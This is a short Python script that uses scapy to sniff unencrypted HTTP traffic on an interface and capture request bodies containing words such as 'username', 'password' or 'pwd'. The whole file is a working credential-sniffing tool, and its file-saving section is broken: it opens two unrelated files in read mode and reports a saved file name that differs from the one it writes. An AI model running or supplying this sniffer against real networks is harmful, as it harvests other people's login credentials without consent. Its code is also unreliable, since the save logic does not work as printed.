import scapy.all as scapy
from scapy.layers import http

def sniff_packets(interface):
    packets = []

    def process_http_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load.decode()  # Convert bytes to string using decode()
                keywords = ["username", "user", "login", "password", "pass", "usr", "userID", "uname", "email", "userPassword", "pswd", "pwd"]
                for keyword in keywords:
                    if keyword in load:
                        packets.append(load)
                        print(load)
                        break

    sniff_thread = scapy.AsyncSniffer(iface=interface, store=False, prn=process_http_packet, filter="port 80")
    sniff_thread.start()

    while True:
        user_input = input("[+] S to stop sniffing [+]\n[+] F to save the results [+] \n")
        if user_input.lower() == 's':
            sniff_thread.stop()
            break
        elif user_input.lower() == 'f':
            file_name = input("Enter a file name to save the output: ")
            with open('sniff results'):
                with open('http'):
                    with open(file_name , 'w') as f:
                        for packet in packets:
                            f.write(packet + '\n')
                print("Results saved to file:", file_name + "_http.txt")
                break

sniff_packets("eth0")
